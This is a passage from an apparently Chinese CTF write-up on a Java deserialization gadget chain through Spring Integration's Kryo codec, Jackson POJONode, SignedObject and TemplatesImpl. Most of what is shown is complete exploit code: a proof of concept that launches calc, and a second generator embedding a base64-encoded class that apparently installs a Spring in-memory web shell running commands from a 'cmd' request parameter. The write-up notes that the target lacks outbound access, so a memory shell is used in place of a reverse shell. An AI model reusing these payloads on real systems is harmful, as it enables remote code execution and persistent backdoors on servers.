readObject(...)<br><br>MapSerializer<br>    -&gt; read(...)<br>       Map#put(hotSwappableTargetSource, ...)<br><br>HotSwappableTargetSource<br>    -&gt; equals(...)<br><br>XString<br>    -&gt; equals(pojoNode)<br><br>BaseJsonNode<br>    -&gt; toString()<br>       InternalNodeMapper#nodeToString(<span class="hljs-built_in">this</span>)<br><br>SignedObject<br>    -&gt; getObject()<br>       a.readObject()<br><br>BadAttributeValueExpException<br>    -&gt; readObject()<br>       valObj.toString()<br><br>BaseJsonNode<br>    -&gt; toString()<br>       InternalNodeMapper#nodeToString(<span class="hljs-built_in">this</span>)<br><br>TemplatesImpl<br>    -&gt; getOutputProperties()<br><br>...<br></code></pre></td></tr></table></figure><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>其实上面Test就是EXP，这里还是象征性给一下吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;<br><span class="hljs-keyword">import</span> org.springframework.messaging.Message;<br><span class="hljs-keyword">import</span> org.springframework.messaging.MessageHeaders;<br><span class="hljs-keyword">import</span> org.springframework.messaging.support.GenericMessage;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getTemplates()&#125;);<br><br>        POJONode pojoNode=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        HotSwappableTargetSource hotSwappableTargetSource=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">1</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">2</span>);<br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        hashMap.put(hotSwappableTargetSource,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap.put(hotSwappableTargetSource1,<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(hotSwappableTargetSource,<span class="hljs-string">&quot;target&quot;</span>,pojoNode);<br>        setFieldValue(hotSwappableTargetSource1,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;a&quot;</span>));<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMap, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        POJONode pojoNode1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        HotSwappableTargetSource hotSwappableTargetSource2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">3</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource3=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">4</span>);<br><br>        HashMap hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap1.put(hotSwappableTargetSource2,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap1.put(hotSwappableTargetSource3,<span class="hljs-string">&quot;2&quot;</span>);<br><br>        setFieldValue(hotSwappableTargetSource2,<span class="hljs-string">&quot;target&quot;</span>,pojoNode1);<br>        setFieldValue(hotSwappableTargetSource3,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;b&quot;</span>));<br><br>        <span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>        <span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap1);<br>        <span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>        System.out.println(Base64.getEncoder().encodeToString(decodemsg));<br><br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-comment">//Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders) null);</span><br>        <span class="hljs-comment">//messagecode.getPayload();</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException &#123;<br>        ClassPool classPool=ClassPool.getDefault();<br>        CtClass ctClass=classPool.makeClass(<span class="hljs-string">&quot;Test&quot;</span>);<br>        ctClass.setSuperclass(classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但遗憾的是题目不出网，本地虽然出网也打不了反弹shell。</p><p>那么这里就要写个内存马进去了。</p><p>也很简单，直接用存的一个Spring马：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;<br><span class="hljs-keyword">import</span> org.springframework.messaging.support.GenericMessage;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        String s=<span class="hljs-string">&quot;yv66vgAAADQAzQoANQBOCABPCwAqAFAIAFEKAFIAUwoACQBUCABVCgAJAFYHAFcIAFgIAFkIAFoIAFsKAFwAXQoAXABeCgBfAGAHAGEKABEAYggAYwoAEQBkCgARAGUKABEAZggAZwsAKwBoCgBpAGoKAGkAawoAbABtCABuCwBvAHAHAHEHAHILAB4AcwoAdAB1CAB2CgApAHcKAHgAeQoAeAB6BwB8BwB/CAA6BwCABwCBBwCCCgApAIMIAIQKAHsAhQsAhgCHCwCGAIgKACcATgoAHwCJBwCKCgAzAIsHAIwBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAFc2hlbGwBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQANU3RhY2tNYXBUYWJsZQcAVwcAjQcAjgcAYQcAfwcAgQcAggEACkV4Y2VwdGlvbnMHAI8BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAJABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4HAIoBAApTb3VyY2VGaWxlAQANTWVtU2hlbGwuamF2YQwANgA3AQADY21kDACRAJIBAAdvcy5uYW1lBwCTDACUAJIMAJUAlgEAA3dpbgwAlwCYAQAQamF2YS9sYW5nL1N0cmluZwEAAnNoAQACLWMBAAdjbWQuZXhlAQACL2MHAJkMAJoAmwwAnACdBwCeDACfAKABABFqYXZhL3V0aWwvU2Nhbm5lcgwANgChAQACXEEMAKIAowwApAClDACmAJYBAAAMAKcAqAcAqQwAqgCrDACsADcHAK0MAK4ArwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAsAwAsQCyAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nDACzALQHALUMALYAtwEABmNvbmZpZwwAuAC5BwC6DAC7ALwMAL0AvgcAvwEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb24BABRCdWlsZGVyQ29uZmlndXJhdGlvbgEADElubmVyQ2xhc3NlcwEACE1lbVNoZWxsAQAPamF2YS9sYW5nL0NsYXNzAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDADAAMEBAAYvc2hlbGwMAMIAxAcAxQwAxgDHDADIAMkMAMoAywEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMwANwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNbTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9JbnB1dFN0cmVhbQEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAQamF2YS9sYW5nL09iamVjdAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvAQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAA9wcmludFN0YWNrVHJhY2UAIQAnADUAAAAAAAUAAQA2ADcAAQA4AAAAHQABAAEAAAAFKrcAAbEAAAABADkAAAAGAAEAAAATAAEAOgA7AAIAOAAAASEABQAJAAAAqSsSArkAAwIAxgCgBD4SBLgABToEGQTGABIZBLYABhIHtgAImQAFAz4dmQAfBr0ACVkDEgpTWQQSC1NZBSsSArkAAwIAU6cAHAa9AAlZAxIMU1kEEg1TWQUrEgK5AAMCAFM6BbgADhkFtgAPtgAQOga7ABFZGQa3ABISE7YAFDoHGQe2ABWZAAsZB7YAFqcABRIXOggsuQAYAQAZCLYAGSy5ABgBALYAGrEAAAACADkAAAAyAAwAAAAqAAsAKwANACwAFAAtACYALgAoADAAYwAxAHAAMgCAADMAlAA0AJ8ANQCoADcAPAAAAC4ABv0AKAEHAD0fWAcAPv4ALgcAPgcAPwcAQEEHAD3/ABUAAwcAQQcAQgcAQwAAAEQAAAAEAAEARQABAEYARwACADgAAAAZAAAAAwAAAAGxAAAAAQA5AAAABgABAAAAPABEAAAABAABAEgAAQBGAEkAAgA4AAAAGQAAAAQAAAABsQAAAAEAOQAAAAYAAQAAAEEARAAAAAQAAQBIAAgASgA3AAEAOAAAAOoABgAHAAAAf7gAGxIcA7kAHQMAwAAeSyoSH7kAIAIAwAAfTCu2ACESIrYAI00sBLYAJCwrtgAlwAAmThInEigFvQApWQMSKlNZBBIrU7YALDoEBL0ACVkDEi1TuAAuLbkALwIAuQAwAQA6BbsAJ1m3ADE6BisZBRkGGQS2ADKnAAhLKrYANLEAAQAAAHYAeQAzAAIAOQAAAEIAEAAAABcADwAYABsAGQAlABoAKgAbACwAHAAzAB0ASgAeAFcAHwBcACAAYwAhAGwAIgB2ACYAeQAkAHoAJQB+ACcAPAAAAAkAAvcAeQcASwQAAgBMAAAAAgBNAH4AAAASAAIAJgB7AH0ACQCGAHsAwwYJ&quot;</span>;<br>        <span class="hljs-type">byte</span>[] bytes=Base64.getDecoder().decode(s);<br>        <br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        <br>        POJONode pojoNode=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        HotSwappableTargetSource hotSwappableTargetSource=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">1</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">2</span>);<br>        <br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(hotSwappableTargetSource,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap.put(hotSwappableTargetSource1,<span class="hljs-string">&quot;2&quot;</span>);<br>        <br>        setFieldValue(hotSwappableTargetSource,<span class="hljs-string">&quot;target&quot;</span>,pojoNode);<br>        setFieldValue(hotSwappableTargetSource1,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;a&quot;</span>));<br>        <br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMap, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br>        <br>        POJONode pojoNode1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        HotSwappableTargetSource hotSwappableTargetSource2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">3</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource3=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">4</span>);<br>        <br>        HashMap hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap1.put(hotSwappableTargetSource2,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap1.put(hotSwappableTargetSource3,<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(hotSwappableTargetSource2,<span class="hljs-string">&quot;target&quot;</span>,pojoNode1);<br>        setFieldValue(hotSwappableTargetSource3,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;b&quot;</span>));<br>        <br>        <span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>        <span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap1);<br>        <span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>        System.out.println(Base64.getEncoder().encodeToString(decodemsg));<br><span class="hljs-comment">//        Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders) null);</span><br><span class="hljs-comment">//        messagecode.getPayload();</span><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException &#123;<br>        ClassPool classPool=ClassPool.getDefault();<br>        CtClass ctClass=classPool.makeClass(<span class="hljs-string">&quot;Test&quot;</span>);<br>        ctClass.setSuperclass(classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;exec\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>记得URL编码：</p><p><img 